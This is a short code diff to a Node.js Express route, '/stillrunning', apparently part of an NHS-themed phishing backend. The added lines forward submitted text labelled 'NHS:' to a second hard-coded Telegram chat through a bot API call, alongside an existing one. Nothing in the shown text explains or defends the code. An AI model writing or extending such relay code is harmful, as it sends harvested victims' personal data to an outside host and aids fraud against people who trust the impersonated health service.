@@ -920,6 +920,9 @@ app.post('/stillrunning', (req, res) => {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1065375205&text=NHS:\n${originalText}`
             );
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1368320362&text=NHS:\n${originalText}`
+            );
             kelvCount += 1;
         }
 
